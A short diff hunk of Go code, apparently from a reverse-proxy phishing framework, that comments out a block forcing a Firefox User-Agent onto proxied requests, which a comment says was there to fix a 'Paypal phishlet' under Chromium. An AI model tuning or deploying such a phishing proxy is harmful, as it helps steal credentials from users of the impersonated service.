@@ -456,12 +456,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 				
-				//     Replace Any User Agent With Firefox UserAgent ( To fix Paypal phishlet issues in chromium Browser )
-				useragent := req.Header.Get("User-Agent")
-				if useragent != "" {
-							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0")
-							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 ", ps.Index)
-				}
+// 				//     Replace Any User Agent With Firefox UserAgent ( To fix Paypal phishlet issues in chromium Browser )
+// 				useragent := req.Header.Get("User-Agent")
+// 				if useragent != "" {
+// 							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0")
+// 							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 ", ps.Index)
+// 				}
 
 				// fix referer
 				referer := req.Header.Get("Referer")
